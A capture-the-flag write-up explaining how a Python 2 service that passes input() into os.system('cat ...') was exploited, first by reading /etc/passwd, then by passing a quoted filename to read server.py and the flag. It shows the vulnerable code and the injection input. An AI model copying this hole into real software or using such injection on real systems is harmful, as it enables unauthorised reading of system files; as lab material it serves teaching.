# Warmup cat

### Challenge

`https://imgur.com/a/NAuGuop os.system(('\\cat ' + user_input_olddie_eol))`

Flag format: DCTF{sha256}

### My solution

By connecting to the service via netcat, and throwing random inputs, we have python errors.

```
Exec: aaaa
aaaa
Traceback (most recent call last):
  File "server.py", line 2, in <module>
    Niswanob1=input('Exec: ')
  File "<string>", line 1, in <module>
NameError: name 'aaaa' is not defined
```

 By chance, one of my random inputs was `id` and gave me another error :

```
Traceback (most recent call last):
  File "server.py", line 3, in <module>
    os.system(('\\cat ' + Niswanob1))
TypeError: cannot concatenate 'str' and 'builtin_function_or_method' objects
```

There I realized that what we input is interpreted as literal python code, not strings. It is a known *bug* of Python 2 with the `input` function.
I don't know why, but during my initial solve I then tried to craft strings by concatenating `chr()` instances.
I first tried to read `/etc/passwd` as a proof of concept, then read the `server.py` and got the flag.

An easier way to solve this challenge is just to pass the string in quotes, for instance :

```
Exec: "server.py"
"server.py"
import os
Niswanob1=input('Exec: ')
os.system(('\\cat ' + Niswanob1))
# ctf{...}
```

Note : To this day I don't know the use of the backslash prior to the `cat`.